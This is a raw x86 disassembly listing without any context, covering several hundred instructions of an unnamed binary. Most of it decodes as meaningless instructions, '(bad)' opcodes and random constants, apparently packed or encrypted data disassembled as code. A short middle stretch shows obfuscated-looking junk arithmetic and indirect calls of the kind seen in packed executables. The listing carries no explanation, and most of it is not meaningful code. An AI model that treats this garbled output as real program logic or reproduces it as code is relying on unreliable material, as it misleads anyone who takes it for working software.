  403e88:	mov    edi,0x6d919930
  403e8d:	repz sar DWORD PTR [edx],1
  403e90:	mov    dh,0x2e
  403e92:	dec    edx
  403e93:	mov    esp,0xac9c3d0f
  403e98:	mov    ebp,0x7bd0dddc
  403e9d:	push   ebx
  403e9e:	js     0x403e76
  403ea0:	jb     0x403e88
  403ea2:	add    dh,BYTE PTR [ebx+0x387ec350]
  403ea8:	pop    edi
  403ea9:	add    ecx,DWORD PTR [bx+di+0x1b98]
  403eae:	lods   eax,DWORD PTR ds:[esi]
  403eaf:	fcom   DWORD PTR [edx+0x35a42ea9]
  403eb5:	xchg   esi,eax
  403eb6:	in     al,dx
  403eb7:	rcl    cl,1
  403eb9:	xchg   BYTE PTR [ecx],ah
  403ebb:	xor    al,0xef
  403ebd:	neg    BYTE PTR [eax+0x46]
  403ec0:	and    bl,ah
  403ec2:	or     al,0x86
  403ec4:	jg     0x403ebe
  403ec6:	mov    ecx,0x43f4ed1e
  403ecb:	lahf   
  403ecc:	dec    DWORD PTR [esi+edi*8-0xb9c1c75]
  403ed3:	fstp   TBYTE PTR [ecx+0x4fc347c4]
  403ed9:	sub    eax,0xc6e0f4
  403ede:	gs fsubp st(3),st
  403ee1:	fcom   QWORD PTR [edi-0x56]
  403ee4:	sahf   
  403ee5:	mov    ah,0x3b
  403ee7:	addr16 test al,0xce
  403eea:	cmp    BYTE PTR [ecx+0x41179c32],ah
  403ef0:	inc    ebp
  403ef1:	loope  0x403e99
  403ef3:	jecxz  0x403ecf
  403ef5:	jle    0x403e7f
  403ef7:	into   
  403ef8:	jo     0x403eea
  403efa:	(bad)  
  403efd:	(bad)  
  403efe:	jne    0x403f2f
  403f00:	mov    ds:0x1b262eb7,al
  403f05:	xlat   BYTE PTR ds:[ebx]
  403f06:	aaa    
  403f07:	imul   DWORD PTR [esi]
  403f09:	int    0x9c
  403f0b:	(bad)  
  403f0c:	sbb    BYTE PTR [esi],al
  403f0e:	scas   eax,DWORD PTR es:[edi]
  403f0f:	xchg   ebx,eax
  403f10:	into   
  403f11:	ret    
  403f12:	fisub  WORD PTR [ebp+0x34]
  403f15:	inc    eax
  403f16:	mov    edi,0xedd4add8
  403f1b:	into   
  403f1c:	mov    ebp,0x9baff651
  403f21:	xchg   edi,eax
  403f22:	int    0x91
  403f24:	mov    BYTE PTR [edi+0x77],ah
  403f27:	add    ecx,DWORD PTR [edi+0x43]
  403f2a:	jle    0x403f35
  403f2c:	mov    ch,0xed
  403f2e:	aas    
  403f2f:	jmp    0x403f2f
  403f31:	xor    al,0x2f
  403f33:	or     BYTE PTR [ebx],ah
  403f35:	mov    edi,0x2fad0698
  403f3a:	jo     0x403ef6
  403f3c:	mov    ebx,0xc39d7fa2
  403f41:	mov    esp,0x2872e2ae
  403f46:	stos   BYTE PTR es:[edi],al
  403f47:	cmp    esi,DWORD PTR [eax+0x73]
  403f4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f4b:	mov    bh,0x21
  403f4d:	sar    esp,0xe0
  403f50:	add    BYTE PTR [ecx-0x6730a792],ch
  403f56:	mov    cl,0xf0
  403f58:	pop    edi
  403f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f5a:	scas   eax,DWORD PTR es:[edi]
  403f5b:	or     al,0xf0
  403f5d:	and    ebx,DWORD PTR [eax]
  403f5f:	ins    BYTE PTR es:[edi],dx
  403f60:	push   esp
  403f61:	inc    ebx
  403f62:	retf   
  403f63:	adc    DWORD PTR [esi-0x111d05f3],edx
  403f69:	sbb    BYTE PTR [edx+0x5a],0xe0
  403f6d:	jg     0x403efc
  403f6f:	imul   edi,DWORD PTR [esi+0x1ef0ae06],0x3c
  403f76:	mov    eax,0x1efedf16
  403f7b:	xchg   edi,eax
  403f7c:	lods   eax,DWORD PTR ds:[esi]
  403f7d:	aaa    
  403f7e:	xchg   ebp,eax
  403f7f:	pop    esp
  403f80:	sar    al,0xe4
  403f83:	lds    ebx,FWORD PTR [ebp-0x65]
  403f86:	sbb    DWORD PTR ds:[edi+0x74],eax
  403f8a:	xor    dl,BYTE PTR [ecx+0x3f]
  403f8d:	cmp    DWORD PTR [ecx+0x5f896be9],0xe630a792
  403f97:	mov    bl,0xa2
  403f99:	mov    ecx,0x443865b6
  403f9e:	xchg   edi,eax
  403f9f:	ficom  WORD PTR [ebp-0x30a399d6]
  403fa5:	mov    ecx,db5
  403fa8:	push   esi
  403fa9:	or     BYTE PTR [ebx+ecx*1],bl
  403fac:	imul   eax,DWORD PTR [eax+0x47],0xffd9ee4f
  403fb3:	ret    0x1373
  403fb6:	push   es
  403fb7:	fsub   QWORD PTR [edx+0x7b2f57eb]
  403fbd:	lods   eax,DWORD PTR ds:[esi]
  403fbe:	test   DWORD PTR [ecx-0x417aee14],0x81722cd6
  403fc8:	mov    ds:0x19ecb531,al
  403fcd:	rcr    al,1
  403fcf:	(bad)  
  403fd0:	stc    
  403fd1:	xlat   BYTE PTR ds:[ebx]
  403fd2:	cmp    eax,0x666dd424
  403fd7:	in     eax,0xb5
  403fd9:	cmp    eax,0xa47b8c2c
  403fde:	dec    edi
  403fdf:	dec    ecx
  403fe0:	mov    esi,0xd8171f08
  403fe5:	(bad)  
  403fe6:	ficom  DWORD PTR ds:[edi-0x261c45a1]
  403fed:	cmp    ch,BYTE PTR [edi+0x79]
  403ff0:	scas   eax,DWORD PTR es:[edi]
  403ff1:	xchg   ebp,eax
  403ff2:	iret   
  403ff3:	outs   dx,DWORD PTR ds:[esi]
  403ff4:	inc    esp
  403ff5:	retf   
  403ff6:	and    al,0xc1
  403ff8:	dec    ebp
  403ff9:	addr16 gs push esi
  403ffc:	cmp    BYTE PTR [esi-0x43],bl
  403fff:	retf   
  404000:	push   0xfc3f01a
  404005:	sub    BYTE PTR [edi+0x40e539],cl
  40400b:	jle    0x403f97
  40400d:	dec    edi
  40400e:	punpcklbw mm4,DWORD PTR [esi+0x78ca66f3]
  404015:	dec    edx
  404016:	mov    ch,BYTE PTR [edi-0x534cb51d]
  40401c:	pop    ecx
  40401d:	ror    DWORD PTR [esi+0x67a0d458],cl
  404023:	dec    esp
  404024:	mov    al,ds:0xeaac21b
  404029:	mov    eax,0xfed03e19
  40402e:	rcr    DWORD PTR [ebx+0x74dcc3a8],cl
  404034:	in     eax,dx
  404035:	add    eax,DWORD PTR [ecx+0x4]
  404038:	jbe    0x404027
  40403a:	add    DWORD PTR [ebp+0x4e52ea4],0x821d51cd
  404044:	jmp    0x403fc6
  404046:	into   
  404047:	es fninit 
  40404a:	sti    
  40404b:	and    BYTE PTR [eax-0xd],dh
  40404e:	inc    ebx
  40404f:	dec    ecx
  404050:	adc    BYTE PTR [ecx],bl
  404052:	mov    ebp,DWORD PTR [eax]
  404054:	jmp    0x6e18:0xc8ac8445
  40405b:	and    dh,BYTE PTR ds:0x1abeb1c7
  404061:	popa   
  404062:	call   0x67752b46
  404067:	sub    DWORD PTR [ecx-0x16],edx
  40406a:	call   0x10fc6f8d
  40406f:	bound  esi,QWORD PTR [edx]
  404071:	mov    DWORD PTR [esp+edi*2+0x77],esp
  404075:	sti    
  404076:	xchg   edi,eax
  404077:	xchg   ecx,eax
  404078:	xor    DWORD PTR [edx+eax*4+0x76dd52a1],ebx
  40407f:	inc    ecx
  404080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404081:	out    0x7b,eax
  404083:	test   eax,0x387e78e3
  404088:	mov    bl,0x1c
  40408a:	xchg   esp,eax
  40408b:	mov    al,0xd
  40408d:	add    eax,0x407c32e8
  404092:	sbb    eax,0xc8a841db
  404097:	rcr    BYTE PTR [ecx-0x18dcf1d6],1
  40409d:	test   al,0x74
  40409f:	scas   al,BYTE PTR es:[edi]
  4040a0:	mov    cs,WORD PTR [ecx+0x5f4b946]
  4040a6:	(bad)  
  4040a8:	arpl   WORD PTR ds:0xf142bb1e,di
  4040ae:	outs   dx,DWORD PTR ds:[esi]
  4040af:	add    eax,0xc94f355f
  4040b4:	test   DWORD PTR [ebp+eiz*1+0x38d7d93e],esi
  4040bb:	pop    ds
  4040bc:	test   bh,dh
  4040be:	mov    edx,0x930151d2
  4040c3:	les    eax,FWORD PTR [ebp+0x73]
  4040c6:	mov    fs,WORD PTR [ecx+0x2d]
  4040c9:	lock leavew 
  4040cc:	mov    BYTE PTR [esi+0x107a8bda],ah
  4040d2:	pop    edx
  4040d3:	jge    0x404101
  4040d5:	nop
  4040d6:	pop    es
  4040d7:	ror    BYTE PTR [edx+0xd],cl
  4040da:	mov    ecx,0xb471d3e7
  4040df:	ja     0x4040f1
  4040e1:	mov    esi,0x7e33592
  4040e6:	mov    ds:0x91661a10,eax
  4040eb:	stc    
  4040ec:	and    cl,BYTE PTR [esi]
  4040ee:	icebp  
  4040ef:	stos   DWORD PTR es:[edi],eax
  4040f0:	lods   al,BYTE PTR ds:[esi]
  4040f1:	mov    esp,0xc4021af8
  4040f6:	sbb    al,0xa1
  4040f8:	xor    DWORD PTR [ecx],eax
  4040fa:	ins    DWORD PTR es:[edi],dx
  4040fb:	xor    edi,edi
  4040fd:	xchg   edx,eax
  4040fe:	dec    edi
  4040ff:	adc    esi,DWORD PTR [edi]
  404101:	mov    ah,0x3a
  404103:	test   eax,0x6db61ec0
  404108:	fcomp  QWORD PTR [edx+0x0]
  40410b:	shl    BYTE PTR [edi-0xaef0068],1
  404111:	popa   
  404112:	es popf 
  404114:	pop    es
  404115:	pop    esi
  404116:	cmc    
  404117:	dec    esi
  404118:	sub    dl,BYTE PTR [esi+edi*8]
  40411b:	or     DWORD PTR [edi+0x4b],edi
  40411e:	mov    ds:0xfbbf5f70,al
  404123:	inc    edx
  404124:	mov    dh,0x54
  404126:	add    eax,0xa6840231
  40412b:	or     DWORD PTR [si],ebp
  40412e:	ret    0x3e1e
  404131:	sub    al,0x62
  404133:	jns    0x404163
  404135:	lea    ebx,[ecx+0x36]
  404138:	or     BYTE PTR [ebx-0x71],ah
  40413b:	xchg   ecx,eax
  40413c:	iret   
  40413d:	test   eax,0xf426cac9
  404142:	jae    0x40415d
  404144:	stc    
  404145:	(bad)  
  404146:	daa    
  404147:	sub    edx,DWORD PTR [ebx-0x4ccccabd]
  40414d:	test   DWORD PTR [esi+0x4],ebp
  404150:	pop    ecx
  404151:	std    
  404152:	jae    0x40414b
  404154:	mov    ebx,0x48845d3e
  404159:	cmp    BYTE PTR [ebx],0xce
  40415c:	cmp    DWORD PTR [ebp+edx*1-0x543407a6],ecx
  404163:	adc    dl,bh
  404165:	mov    ecx,0x4e5f7604
  40416a:	add    al,0xf0
  40416c:	inc    eax
  40416d:	call   0x7b4b:0xafae37e1
  404174:	pop    esp
  404175:	push   esi
  404176:	or     DWORD PTR [ecx+0x6b],edi
  404179:	cmp    eax,0x51e5d1d1
  40417e:	xchg   ebp,eax
  40417f:	rol    DWORD PTR [edi+0x73],1
  404182:	pop    ebp
  404183:	repnz xor cl,dh
  404186:	aaa    
  404187:	sub    eax,0x95d20de3
  40418c:	imul   eax,DWORD PTR [edi+edx*1],0x9ea27b98
  404193:	and    BYTE PTR ds:0xa17378db,ah
  404199:	icebp  
  40419a:	sbb    al,0x2a
  40419c:	les    edi,FWORD PTR [esi]
  40419e:	jo     0x40417c
  4041a0:	in     eax,0xd2
  4041a2:	push   0xa904166
  4041a7:	mov    al,ds:0xd62d3b0b
  4041ac:	mov    ds:0xe4e52093,eax
  4041b1:	dec    ebx
  4041b2:	jae    0x4041b5
  4041b4:	adc    BYTE PTR [ebx+0x4284753d],al
  4041ba:	add    BYTE PTR [eax],al
  4041bc:	not    ecx
  4041be:	mov    DWORD PTR ds:0x428331,0x38eb
  4041c8:	jmp    0x40423c
  4041cd:	mov    edx,DWORD PTR ds:0x4284cd
  4041d3:	cmp    DWORD PTR ds:0x428475,0x0
  4041da:	jne    0x40421e
  4041e0:	push   DWORD PTR [ebp-0x1c]
  4041e3:	push   0x3daa
  4041e8:	push   0x6a0e
  4041ed:	call   DWORD PTR ds:0x42dff8
  4041f3:	mov    edx,DWORD PTR ds:0x428425
  4041f9:	xor    edx,DWORD PTR ds:0x428561
  4041ff:	mov    DWORD PTR ds:0x428425,edx
  404205:	or     edx,DWORD PTR ds:0x428501
  40420b:	movzx  edx,WORD PTR ds:0x42843d
  404212:	and    DWORD PTR ds:0x428461,edx
  404218:	xor    ecx,0x6193
  40421e:	add    edx,0x3a4f
  404224:	add    DWORD PTR ds:0x428411,ecx
  40422a:	mov    ecx,DWORD PTR ds:0x4283dd
  404230:	mov    edx,DWORD PTR ds:0x428521
  404236:	sub    ecx,edx
  404238:	imul   ecx,DWORD PTR [ecx+edx*1]
  40423c:	mov    eax,DWORD PTR [esi]
  40423e:	cmp    DWORD PTR ds:0x428471,0x0
  404245:	mov    DWORD PTR ds:0x428365,0x80f
  40424f:	mov    DWORD PTR ds:0x428569,ecx
  404255:	jmp    0x4042b8
  40425a:	mov    DWORD PTR ds:0x42841d,0x4518
  404264:	cmp    DWORD PTR ds:0x428471,0x0
  40426b:	jb     0x404293
  404271:	push   DWORD PTR [ebp-0x10]
  404274:	call   DWORD PTR ds:0x42dffc
  40427a:	adc    edx,0x1a1
  404280:	xor    ecx,ecx
  404282:	add    ecx,DWORD PTR ds:0x4284b1
  404288:	mov    edx,DWORD PTR ds:0x4285a1
  40428e:	sub    ecx,edx
  404290:	xor    ecx,DWORD PTR [ecx+edx*1]
  404293:	add    DWORD PTR ds:0x42843d,0x3b89
  40429d:	sbb    DWORD PTR ds:0x428581,ecx
  4042a3:	sub    edx,edx
  4042a5:	movzx  ecx,WORD PTR ds:0x4284e9
  4042ac:	xor    ecx,DWORD PTR ds:0x428559
  4042b2:	mov    DWORD PTR ds:0x4284e9,ecx
  4042b8:	mov    ecx,DWORD PTR [esi+0x4]
  4042bb:	shrd   eax,ecx,0x2
  4042bf:	shr    ecx,0x2
  4042c2:	cmp    DWORD PTR ds:0x428579,0x0
  4042c9:	mov    DWORD PTR ds:0x4284e9,ecx
  4042cf:	mov    DWORD PTR ds:0x428479,0x365d
  4042d9:	jmp    0x404321
  4042de:	mov    DWORD PTR ds:0x428435,0x759d
  4042e8:	cmp    DWORD PTR ds:0x428579,0x0
  4042ef:	jae    0x404315
  4042f5:	call   DWORD PTR ds:0x42e248
  4042fb:	adc    edx,ecx
  4042fd:	mov    ecx,DWORD PTR ds:0x428429
  404303:	and    ecx,DWORD PTR ds:0x428565
  404309:	mov    DWORD PTR ds:0x428429,ecx
  40430f:	sbb    edx,DWORD PTR ds:0x428361
  404315:	sbb    DWORD PTR ds:0x428439,0x7721
  40431f:	add    ecx,ecx
  404321:	mov    ecx,DWORD PTR [esi]
  404323:	mov    edx,DWORD PTR [esi+0x4]
  404326:	xor    eax,edi
  404328:	shl    ecx,0x1e
  40432b:	xor    edx,edx
  40432d:	or     edx,eax
  40432f:	mov    DWORD PTR [ebp-0x4],edx
  404332:	mov    DWORD PTR [ebp-0x30],0xcb79b576
  404339:	mov    eax,0x9c2b8ae8
  40433e:	mov    DWORD PTR [ebp-0x2c],eax
  404341:	mov    DWORD PTR [ebp-0x20],0xcb79b572
  404348:	mov    DWORD PTR [ebp-0x1c],eax
  40434b:	mov    DWORD PTR [ebp-0x10],0xcb79b57e
  404352:	mov    DWORD PTR [ebp-0xc],eax
  404355:	mov    DWORD PTR [ebp-0x60],0xcb79b57a
  40435c:	mov    DWORD PTR [ebp-0x5c],eax
  40435f:	jmp    0x404700
  404364:	cmp    BYTE PTR [eax+0x14],dh
  404367:	cmp    al,0x9c
  404369:	mov    esp,0xa24d7438
  40436e:	mov    BYTE PTR [esp-0x4261dda9],ah
  404375:	sti    
  404376:	mov    esi,0xbec4bdbe
  40437b:	mov    esi,0x8b5c107f
  404380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404381:	adc    ah,BYTE PTR [ebx+0x449878a4]
  404387:	(bad)  
  404388:	cmp    DWORD PTR [ebx+0x58],ebp
  40438b:	lahf   
  40438c:	sbb    al,0xb6
  40438e:	xor    eax,0x454f0dc4
  404393:	ja     0x40439a
  404395:	stos   DWORD PTR es:[edi],eax
  404396:	stos   DWORD PTR es:[edi],eax
  404397:	xor    BYTE PTR [eax],bl
  404399:	jb     0x4043aa
  40439b:	scas   al,BYTE PTR es:[edi]
  40439c:	inc    BYTE PTR [edx-0x240978f8]
  4043a2:	call   0x1739e582
  4043a7:	out    0x16,eax
  4043a9:	cmp    dl,BYTE PTR [edi]
  4043ab:	push   edi
  4043ac:	jmp    0x4043b2
  4043ae:	loope  0x4043ef
  4043b0:	inc    esp
  4043b1:	cmp    BYTE PTR [ecx],bl
  4043b3:	inc    ebx
  4043b4:	mov    esp,0x355b6d5
  4043b9:	bound  eax,QWORD PTR [edi-0x39]
  4043bc:	or     BYTE PTR [edi-0x7d],dh
  4043bf:	cmp    cl,BYTE PTR [eax-0x516cdcce]
  4043c5:	repnz stos DWORD PTR es:[edi],eax
  4043c7:	aam    0xfc
  4043c9:	dec    esp
  4043ca:	push   DWORD PTR [ebx+ebp*1]
  4043cd:	pushf  
  4043ce:	lds    edi,FWORD PTR [eax-0x60874b8e]
  4043d4:	dec    ecx
  4043d5:	call   0xf1bdc8d9
  4043da:	pop    esp
  4043db:	jmp    0x181:0x18213f0f
  4043e2:	adc    edi,esi
  4043e4:	mov    bl,0xdc
  4043e6:	inc    esi
  4043e7:	cmp    ah,BYTE PTR [edi+0x40]
  4043ea:	outs   dx,BYTE PTR ds:[esi]
  4043eb:	rol    ah,1
  4043ed:	and    cl,BYTE PTR [ebp-0x26]
  4043f0:	in     eax,0x4c
  4043f2:	retf   
  4043f3:	cmp    dl,dl
  4043f5:	imul   eax,DWORD PTR [ecx],0xbe10ce35
  4043fb:	ret    
  4043fc:	rol    BYTE PTR [eax],cl
  4043fe:	dec    esi
  4043ff:	sbb    ah,BYTE PTR [edi]
  404401:	push   edi
  404402:	inc    esi
  404403:	mov    ds:0x91566f6c,eax
  404408:	cdq    
  404409:	test   eax,0x15a3173e
  40440e:	lock xchg esp,eax
  404410:	jno    0x4043a5
  404412:	jp     0x404409
  404414:	push   eax
  404415:	sbb    bl,BYTE PTR [edx]
  404417:	gs pop ds
  404419:	inc    ebp
  40441a:	add    DWORD PTR [ecx-0x5f],esp
  40441d:	mov    BYTE PTR [esi],ch
  40441f:	test   eax,0x1c1b8dc
  404424:	mov    al,0xbd
  404426:	cmc    
  404427:	sub    al,0x50
  404429:	jns    0x40449a
  40442b:	mov    ecx,0xed5b952f
  404430:	repnz push cs
  404432:	or     al,0x10
  404434:	mov    BYTE PTR [ebp+0x61538814],0x2
  40443b:	mov    ebp,0x91896757
  404440:	(bad)  [edi+edx*4]
  404443:	in     al,0xbe
  404445:	ds enter 0x9951,0xe5
  40444a:	dec    esi
  40444b:	loop   0x4043ed
  40444d:	push   ecx
  40444e:	inc    eax
  40444f:	add    edi,DWORD PTR [edi]
  404451:	mov    ah,0x6d
  404453:	sbb    eax,0x4182c544
  404458:	push   0x26e3a173
  40445d:	or     eax,DWORD PTR [edx+0x703e9fe2]
  404463:	(bad)  
  404464:	mov    ebx,0x9d109928
  404469:	ja     0x404413
  40446b:	in     eax,0xa5
  40446d:	popa   
  40446e:	xor    DWORD PTR [edi-0x6],esp
  404471:	(bad)  
  404472:	fsub   QWORD PTR [edi-0x4f]
  404475:	adc    esp,DWORD PTR [ebx-0x6b]
  404478:	(bad)  
  40447a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40447b:	or     BYTE PTR [ebp+edx*2+0x6150a358],ah
  404482:	lods   al,BYTE PTR ds:[esi]
  404483:	retf   
  404484:	dec    eax
  404485:	sti    
  404486:	in     al,dx
  404487:	xor    DWORD PTR [ebp-0x4d],ebp
  40448a:	mov    ds:0xdbe6505c,al
  40448f:	adc    ch,BYTE PTR [edi+0xfcfe6d2]
  404495:	pop    ebp
  404496:	xchg   ebp,eax
  404497:	test   DWORD PTR [ecx-0x76],esi
  40449a:	pop    ebp
  40449b:	retf   
  40449c:	push   ecx
  40449d:	je     0x40447d
  40449f:	ins    BYTE PTR es:[edi],dx
  4044a0:	test   DWORD PTR [edi+0x49],ebx
  4044a3:	rcr    DWORD PTR [edx+eax*2-0x7458e9ee],cl
  4044aa:	js     0x404522
  4044ac:	or     eax,0x73e5356c
  4044b1:	scas   al,BYTE PTR es:[edi]
  4044b2:	pop    esp
  4044b3:	dec    edx
  4044b4:	inc    esp
  4044b5:	mov    ecx,0xe39fd3ff
  4044ba:	pop    eax
  4044bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044bc:	ficomp DWORD PTR [ebx]
  4044be:	out    0x59,eax
  4044c0:	imul   eax,DWORD PTR [ebx+0x13],0x40
  4044c4:	xchg   BYTE PTR [ebx-0x3e27f7f5],bh
  4044ca:	ret    
  4044cb:	adc    eax,0x9c1aa1e9
  4044d0:	fld    st(5)
  4044d2:	daa    
  4044d3:	sbb    eax,0xb828b91a
  4044d8:	lods   al,BYTE PTR ds:[esi]
  4044d9:	pop    ebp
  4044da:	dec    eax
  4044db:	dec    ecx
  4044dc:	cmc    
  4044dd:	adc    BYTE PTR [ecx],bh
  4044df:	xchg   dh,cl
  4044e1:	mov    esi,0x2eacd1fc
  4044e6:	aad    0x60
  4044e8:	mov    esp,0xd0f9787e
  4044ed:	dec    eax
  4044ee:	test   esp,0x9e39098b
  4044f4:	jo     0x40449e
  4044f6:	push   esi
  4044f7:	or     BYTE PTR [edi+esi*2],0xcd
  4044fb:	cs aad 0xfc
  4044fe:	xchg   BYTE PTR [ecx-0x1f36b1b7],ah
  404504:	iret   
  404505:	test   eax,0xa65d437c
  40450a:	int    0xcb
  40450c:	bound  eax,QWORD PTR [ecx-0x7443593d]
  404512:	loop   0x404502
  404514:	loopne 0x404525
  404516:	(bad)  
  404517:	nop
  404518:	test   al,0x3f
  40451a:	jle    0x40450d
  40451c:	ds test al,0x4e
  40451f:	mul    BYTE PTR ss:[eax-0x57]
  404523:	and    dl,BYTE PTR [edi+0x6d]
  404526:	mov    WORD PTR [edx+0x2a],ss
  404529:	pop    ecx
  40452a:	mov    ebx,0xfedac399
  40452f:	xor    DWORD PTR [ecx],eax
  404531:	out    0xfb,al
  404533:	aad    0x8d
  404535:	push   ebp
  404536:	cmp    ch,ah
  404538:	das    
  404539:	loopne 0x40453c
  40453b:	inc    ebx
  40453c:	bound  edx,QWORD PTR [edi+0x44115f1f]
  404542:	out    0x91,eax
  404544:	ss ins BYTE PTR es:[edi],dx
  404546:	je     0x404583
  404548:	mov    al,ds:0x94e16893
  40454d:	or     eax,0x6c3d566c
  404552:	pop    ebp
  404553:	mov    ds:0xeef90c59,al
  404558:	dec    edi
  404559:	test   BYTE PTR ds:0x1e42d6c,0x25
  404560:	pop    ebp
  404561:	or     al,0xa3
  404563:	push   ebx
  404564:	lea    ebx,ds:0xe2671b4f
  40456a:	(bad)  
  40456b:	les    edx,FWORD PTR [ecx+0x1c559a22]
  404571:	(bad)  [edx]
  404573:	adc    BYTE PTR [edx+0x37],bh
  404576:	sti    
  404577:	aam    0x49
  404579:	popa   
  40457a:	fldcw  WORD PTR [edi+0x4b40fd53]
  404580:	pop    ecx
  404581:	test   al,0x26
  404583:	ds push esp
  404585:	int    0xca
  404587:	pop    ss
  404588:	(bad)  
  40458a:	sbb    eax,0x64dddb57
  40458f:	fild   WORD PTR [edi+0x3a]
  404592:	retf   
  404593:	out    dx,eax
  404594:	sub    al,0xee
  404596:	and    esi,ebp
  404598:	adc    esp,DWORD PTR [edi+ecx*2]
  40459b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40459c:	(bad)  
  40459d:	cdq    
  40459e:	int    0xdd
  4045a0:	push   ds
  4045a1:	out    0x85,al
  4045a3:	push   eax
  4045a4:	mov    ah,0xc8
  4045a6:	push   edi
  4045a7:	push   ds
  4045a8:	js     0x404539
  4045aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045ab:	mov    al,ds:0xb097599a
  4045b0:	push   es
  4045b1:	jbe    0x404586
  4045b3:	adc    eax,esp
  4045b5:	xor    DWORD PTR [esi-0x25],esi
  4045b8:	int3   
  4045b9:	sahf   
  4045ba:	mov    ch,bl
  4045bc:	shl    BYTE PTR [ecx+0x5b],cl
  4045bf:	mov    ebp,0xce9d1a7f
  4045c4:	es popa 
  4045c6:	or     DWORD PTR [ecx],esp
  4045c8:	loope  0x4045ee
  4045ca:	aas    
  4045cb:	ins    DWORD PTR es:[edi],dx
  4045cc:	arpl   WORD PTR [ebp-0x1f],sp
  4045cf:	pop    ss
  4045d0:	mov    ah,0x7c
  4045d2:	adc    bh,dh
  4045d4:	inc    ecx
  4045d5:	add    eax,0x3f7778f5
  4045da:	mov    dl,0x56
  4045dc:	int    0x47
  4045de:	sub    BYTE PTR [edx+0x3c],cl
  4045e1:	loop   0x40458a
  4045e3:	xor    BYTE PTR [edi],0xa4
  4045e6:	outs   dx,BYTE PTR ds:[esi]
  4045e7:	push   edx
  4045e8:	aad    0x9
  4045ea:	mov    ss,WORD PTR [esi+ebx*4]
  4045ed:	xlat   BYTE PTR ds:[ebx]
  4045ee:	jg     0x40457b
  4045f0:	pop    edi
  4045f1:	fs stos DWORD PTR es:[edi],eax
  4045f3:	mov    cl,0x6c
  4045f5:	add    BYTE PTR es:[eax+0x7567f741],al
  4045fc:	mov    cl,0x72
  4045fe:	ret    0x56c9
  404601:	enter  0xe345,0xc4
  404605:	add    eax,0x8e463aa8
  40460a:	jbe    0x4045c9
  40460c:	shl    dl,1
  40460e:	gs mov cl,0x1f
  404611:	sbb    edx,DWORD PTR [edx+ecx*8+0x79ba8a94]
  404618:	add    eax,0xf50d7579
  40461d:	inc    ebp
  40461e:	mov    ah,0x49
  404620:	test   DWORD PTR [ecx+0x5c],eax
  404623:	cmc    
  404624:	mov    edx,0xc969d0d9
  404629:	(bad)  
  40462a:	fdivp  st(7),st
  40462c:	mov    ebp,0xd090d7c6
  404631:	les    ecx,FWORD PTR [edx-0x3d118f1a]
  404637:	mov    eax,0x5ca6522d
  40463c:	(bad)  
  40463d:	es mov dh,0x2b
  404640:	dec    esp
  404641:	shr    DWORD PTR [edi+0x346b2288],cl
  404647:	push   ebx
  404648:	stos   DWORD PTR es:[edi],eax
  404649:	xchg   ebp,eax
  40464a:	jmp    0x1068:0x710ca33b
  404651:	pusha  
  404652:	mov    dh,0xe2
  404654:	inc    esi
  404655:	outs   dx,DWORD PTR ds:[esi]
  404656:	jmp    0xf220e9ad
  40465b:	(bad)  
  40465c:	jg     0x4046d2
  40465e:	mov    al,ds:0x5a40e597
  404663:	jo     0x404681
  404665:	dec    esp
  404666:	mov    edx,edi
  404668:	sub    eax,DWORD PTR [esi+0x71c397b3]
  40466e:	mov    edi,DWORD PTR [ebx+0x4e00fb3c]
  404674:	jecxz  0x4046b9
  404676:	iret   
  404677:	sbb    ch,BYTE PTR [edx+ebx*2-0x5535a452]
  40467e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40467f:	xor    ah,BYTE PTR [ecx]
  404681:	das    
  404682:	mov    cl,0x1b
  404684:	and    al,0xf4
  404686:	adc    al,0x9e
  404688:	aam    0x57
  40468a:	xor    cl,BYTE PTR [esi+0x77389414]
  404690:	ret    0x5934
  404693:	mov    edi,0x6b8f4a9f
  404698:	xor    DWORD PTR [esi+0x67],ebx
  40469b:	jmp    0xe92799fb
  4046a0:	push   esi
  4046a1:	inc    ebx
  4046a2:	or     ah,BYTE PTR [ecx+0x12]
  4046a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046a6:	nop
  4046a7:	sub    DWORD PTR [edi],eax
  4046a9:	rcr    dh,0xea
  4046ac:	jno    0x40466a
  4046ae:	inc    edx
  4046af:	xor    BYTE PTR [esi],0x48
  4046b2:	outs   dx,DWORD PTR ds:[esi]
  4046b3:	xchg   ecx,eax
  4046b4:	fs xchg edi,eax
  4046b6:	test   BYTE PTR [ecx-0x1963ff00],al
  4046bc:	arpl   WORD PTR [edx-0x2f],sp
  4046bf:	mov    cl,0x38
  4046c1:	lea    edx,[ebp+0x3dc69c0]
  4046c7:	push   esp
  4046c8:	fs addr16 (bad) 
  4046cb:	out    0xbb,eax
  4046cd:	retf   0x8a93
  4046d0:	pop    eax
  4046d1:	mov    WORD PTR [ebp-0x7e],?
  4046d4:	mov    ebx,0xe4a28c61
  4046d9:	or     bl,BYTE PTR [ecx+0x6f]
  4046dc:	enter  0x4be0,0xac
  4046e0:	jge    0x4046a3
  4046e2:	outs   dx,DWORD PTR ds:[esi]
  4046e3:	std    
  4046e4:	push   esi
  4046e5:	and    eax,0x397c9d36
  4046ea:	pop    edx
  4046eb:	rcr    BYTE PTR [ecx+0x46],0xc3
  4046ef:	inc    esp
  4046f0:	xlat   BYTE PTR ds:[ebx]
  4046f1:	mov    bh,0xb1
  4046f3:	and    BYTE PTR [eax+0x3690557e],ch
  4046f9:	dec    eax
  4046fa:	push   ebx
  4046fb:	or     DWORD PTR [esi-0x74b0ff4a],ebp
  404701:	inc    ebp
  404702:	ror    BYTE PTR [ebx-0x53f02bb3],1
  404708:	enter  0xc102,0xe9
  40470c:	add    cl,BYTE PTR [ebx+0x558bd04d]
  404712:	aam    0x33
  404714:	mov    ecx,0xd2331ee1
  40471a:	or     eax,edx
  40471c:	lea    eax,[ebp+eax*1-0x4]
  404720:	mov    DWORD PTR [ebp-0x34],eax
  404723:	mov    eax,DWORD PTR [ebp-0x30]
  404726:	mov    ecx,DWORD PTR [ebp-0x2c]
  404729:	shrd   eax,ecx,0x2
  40472d:	shr    ecx,0x2
  404730:	mov    ecx,DWORD PTR [ebp-0x30]
